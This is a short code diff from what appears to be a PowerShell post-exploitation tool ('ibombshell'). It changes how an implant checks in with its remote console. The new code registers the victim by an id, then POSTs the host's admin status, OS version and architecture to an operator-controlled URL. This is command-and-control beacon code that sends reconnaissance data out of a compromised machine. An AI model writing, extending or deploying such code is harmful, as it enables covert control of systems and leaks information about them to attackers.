@@ -77,8 +77,9 @@ function console{
             {
                 try 
                 {
-                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin/$os_version/$os_arch"
-                    #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
+                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id"
+                    $data = "custominfo`n" + $id + "`n" + $admin + "`n" + $os_version + $os_arch
+                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/data-ibombshell/$id" -Body @{results=$data}
                     break
                 }
                 catch 
